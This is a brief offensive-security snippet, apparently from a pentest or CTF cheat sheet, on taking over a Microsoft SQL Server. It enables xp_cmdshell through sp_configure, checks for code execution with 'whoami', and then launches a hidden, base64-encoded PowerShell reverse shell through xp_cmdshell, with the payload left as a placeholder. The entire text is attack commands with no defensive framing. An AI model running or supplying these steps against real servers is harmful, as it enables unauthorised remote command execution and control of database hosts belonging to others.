> Enable Command Execution Capabilities:

```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

> Now test to see if we can run commands:

```
EXECUTE xp_cmdshell 'whoami';
```

> If we get a return of our command indicating that we have RCE, we can use a powershell encoded reverse shell script to get a reverse shell:

```
EXECUTE xp_cmdshell 'powershell -nop -w hidden -e <base64_shell>;
```
